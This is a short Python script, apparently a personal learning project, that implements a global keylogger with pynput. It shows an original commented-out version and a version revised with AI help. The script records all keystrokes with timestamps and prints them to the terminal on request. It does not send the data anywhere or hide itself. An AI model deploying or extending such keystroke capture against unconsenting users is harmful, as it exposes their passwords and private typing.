# from pynput import keyboard
# import time
# import threading
# import os
#
# rec = 0
# # function to show the time now & use in time library
# def local_time():
#     current = time.strftime("%d-%m-%Y %H:%M")
#     return current
#
# # function to change chars
# def sstring_control(a:str):
#     a = a.replace("'","")
#     a = a.replace("Key.space"," ")
#     a = a.replace( "Key.enter", "\n")
#     return a
# sstring = "**" + local_time() + "**\n"
#
# #function to add the presses to storage named "sstring" and check the time to add this if its currect
# def on_press(key):
#     global sstring
#     time_now = local_time()
#     if time_now in sstring:
#         sstring += str(key)
#     else:
#         sstring += "**" + time_now + "**\n" + str(key)
#
# # function to play the dispaly in terminal of all keys presses
# def show():
#     while True:
#         show = input()
#         if show == 'show':
#             print(f'sstring is - \n {sstring}')
#
#
# #  A function that passes the values to a function that names the values
# def on_release(key):
#     global sstring
#     sstring = sstring_control(sstring)
#
# # A function that contains the main function of the Pynput package and another function inside that explains what it does
# def record():
#     #play action for stop with os library
#     def deleted():
#         os._exit(0)
#
#     time.sleep(0.1)
#     # creatd the command for stop
#     hotkey = keyboard.GlobalHotKeys({
#         "<shift>+<ctrl>+t": deleted
#     })
#     hotkey.start()
#     with keyboard.Listener(
#             on_press=on_press,
#             on_release=on_release) as listener:
#         listener.join()
#
# # play the all page with use threading library
# def main():
#     global rec
#     rec = threading.Thread(target=record )
#     rec.start()
#     show()
# main()




# לאחר תיקונים של AI
from pynput import keyboard
import time
import threading
import os

stop_event = threading.Event()


def local_time():
    return time.strftime("%d-%m-%Y %H:%M")


def sstring_control(a: str):
    return a.replace("'", "").replace("Key.space", " ").replace("Key.enter", "\n")


sstring = "**" + local_time() + "**\n"


def on_press(key):
    global sstring
    time_now = local_time()
    if time_now in sstring:
        sstring += str(key)
    else:
        sstring += f"**{time_now}**\n{str(key)}"


def show():
    while not stop_event.is_set():
        show_input = input()
        if show_input.strip().lower() == 'show':
            print(f'sstring is - \n {sstring}')
        elif show_input.strip().lower() == 'exit':
            stop_event.set()
            break


def on_release(key):
    global sstring
    sstring = sstring_control(sstring)


def record():
    def stop_logging():
        stop_event.set()
        os._exit(0)

    hotkey = keyboard.GlobalHotKeys({"<shift>+<ctrl>+t": stop_logging})
    hotkey.start()

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


def main():
    print("p")
    try:
        threading.Thread(target=record, daemon=True).start()
        threading.Thread(target=show, daemon=True).start()
        while not stop_event.is_set():
            time.sleep(1)
    except KeyboardInterrupt:
        print("the program stop")



if __name__ == "__main__":
    main()
